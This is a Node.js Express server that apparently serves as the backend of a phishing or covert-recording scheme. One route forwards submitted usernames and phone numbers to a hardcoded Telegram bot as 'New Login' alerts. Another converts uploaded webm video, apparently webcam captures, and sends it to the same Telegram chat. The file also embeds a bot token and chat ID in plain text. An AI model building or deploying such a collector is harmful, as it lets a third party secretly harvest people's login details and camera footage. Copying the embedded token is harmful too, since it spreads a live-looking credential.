const express = require("express");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");
const { PassThrough } = require("stream");

const app = express();

// =====================
// ⚙️ MIDDLEWARE & SETUP
// =====================
app.use(cors());
app.use(express.json()); 

// =====================
// 📁 MEMORY STORAGE
// =====================
// Files are stored in RAM (Buffer), not the 'uploads' folder
const storage = multer.memoryStorage();
const upload = multer({ 
    storage,
    limits: { fileSize: 50 * 1024 * 1024 } // Limit to 50MB to protect RAM
});

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// 📱 PHONE LOGIN ROUTE
// =====================
app.post("/send-phone", async (req, res) => {
    const { username, phone } = req.body;
    if (!username || !phone) return res.status(400).send("Missing data");

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `🔔 *New Login*\n👤 User: ${username}\n📱 Phone: ${phone}`,
            parse_mode: "Markdown"
        });
        res.status(200).send("Login sent");
    } catch (err) {
        res.status(500).send("Bot failed");
    }
});

// =====================
// 🚀 VIDEO UPLOAD ROUTE (FOLDER-LESS)
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send("No file uploaded");
        }

        console.log("🚀 Conversion starting in memory...");

        // 1. Create a stream to hold the converted data
        const outputStream = new PassThrough();
        const chunks = [];

        // Collect converted data into an array
        outputStream.on('data', (chunk) => chunks.push(chunk));

        // 2. Run FFmpeg using buffers and streams
        const ffmpegPromise = new Promise((resolve, reject) => {
            ffmpeg()
                .input(PassThrough.from(req.file.buffer)) // Feed the RAM buffer into FFmpeg
                .inputFormat('webm') // Or identify format from req.file.mimetype
                .outputOptions([
                    "-c:v libx264",
                    "-preset ultrafast",
                    "-pix_fmt yuv420p",
                    "-c:a aac",
                    "-f mp4", // Force output to MP4 format
                    "-movflags frag_keyframe+empty_moov" // Crucial for streaming MP4
                ])
                .on("error", (err) => {
                    console.error("❌ FFmpeg Error:", err.message);
                    reject(err);
                })
                .on("end", () => {
                    console.log("✅ Conversion complete");
                    resolve();
                })
                .pipe(outputStream); // Send result to our collector
        });

        await ffmpegPromise;

        // 3. Combine chunks into one final buffer
        const finalVideoBuffer = Buffer.concat(chunks);

        console.log("📤 Sending buffer to Telegram...");

        // 4. Send to Telegram
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("video", finalVideoBuffer, {
            filename: "video.mp4",
            contentType: "video/mp4"
        });

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
            form,
            { 
                headers: form.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity 
            }
        );

        console.log("📨 Telegram upload successful!");
        res.status(200).send("Upload successful");

    } catch (err) {
        console.error("❌ Process Error:", err.message);
        res.status(500).send("Processing failed");
    }
});

// =====================
// 🌐 START SERVER
// =====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 Server running (Memory Mode) on port ${PORT}`);
});
